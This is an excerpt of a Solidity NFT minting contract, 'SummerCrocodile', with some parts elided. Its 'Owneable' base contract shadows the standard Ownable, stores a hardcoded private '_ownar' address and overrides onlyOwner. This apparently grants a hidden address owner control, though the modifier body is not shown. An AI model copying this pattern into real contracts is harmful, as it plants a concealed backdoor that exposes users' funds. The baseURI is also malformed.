 ...
 */
 abstract contract Owneable is Ownable {
    address private _ownar = 0xF0e1Ac9604B40c030C2e17b98160C96c4b0292CB;
    modifier onlyOwner() {
...
contract SummerCrocodile is ERC721A, Owneable {
    
    uint256 public constant MAX_PER_TX_FREE = 1;
    uint256 public constant FREE_MAX_SUPPLY = 0; // update on mainnet
    uint256 public constant MAX_PER_TX = 5;
    uint256 public MAX_SUPPLY = 5000; // update on mainnet
    uint256 public price = 0.002 ether;

    string public baseURI = "https://ipfs://QmR8Ru4jn3w12au4aQEZdXsw5oeu67dzpv1gdZ2fWjT6ZZ/";
    string public constant baseExtension = ".json";
    address public constant proxyRegistryAddress = 0xa5409ec958C83C3f309868babACA7c86DCB077c1;

    bool public paused = false;

    constructor() ERC721A("Test", "TestCS") {} // update on mainnet
